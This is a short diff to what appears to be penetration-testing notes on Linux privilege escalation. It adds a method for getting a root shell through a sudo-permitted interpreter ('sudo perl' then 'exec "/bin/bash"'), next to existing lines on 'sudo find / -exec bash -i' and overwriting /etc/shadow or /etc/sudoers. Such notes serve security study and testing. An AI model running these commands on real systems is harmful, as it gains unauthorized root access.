@@ -137,6 +137,14 @@ Overwrite /etc/shadow or /etc/sudoers
 sudo find / -exec bash -i \;
 ```
 
+**python/perl/ruby/lua/etc**
+
+```
+sudo perl
+exec "/bin/bash";
+ctr-d
+```
+
 ### Software vulnerabilites
 
 Software vulnerabilites can lead to priv-esc, like vulnerabiliteis in:
